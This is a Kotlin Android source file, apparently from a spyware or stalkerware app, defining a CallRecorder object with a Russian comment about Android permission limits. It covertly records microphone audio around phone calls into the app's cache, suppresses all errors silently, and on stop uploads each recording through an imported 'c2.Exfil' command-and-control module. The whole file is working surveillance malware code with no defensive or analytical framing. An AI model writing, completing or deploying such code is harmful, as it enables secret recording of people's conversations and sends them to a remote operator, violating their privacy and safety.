package com.sp.core.services

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import com.sp.core.c2.Exfil
import java.io.File

// ВАЖНО: без CAPTURE_AUDIO_OUTPUT (system app) или root запись
// входящего/исходящего аудита звонка невозможна на Android 10+.
// Класс пишет с микрофона — окружение разговора, не сам звонок.
object CallRecorder {
    private var recorder: MediaRecorder? = null
    private var file: File? = null

    fun start(ctx: Context) {
        try {
            file = File(ctx.cacheDir, "call_${System.currentTimeMillis()}.m4a")
            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
                MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setOutputFile(file!!.absolutePath)
                prepare(); start()
            }
        } catch (_: Exception) {}
    }

    fun stop(ctx: Context) {
        try { recorder?.stop() } catch (_: Exception) {}
        recorder?.release(); recorder = null
        file?.let { if (it.exists()) Exfil.uploadFile(ctx, it, "call") }
    }
}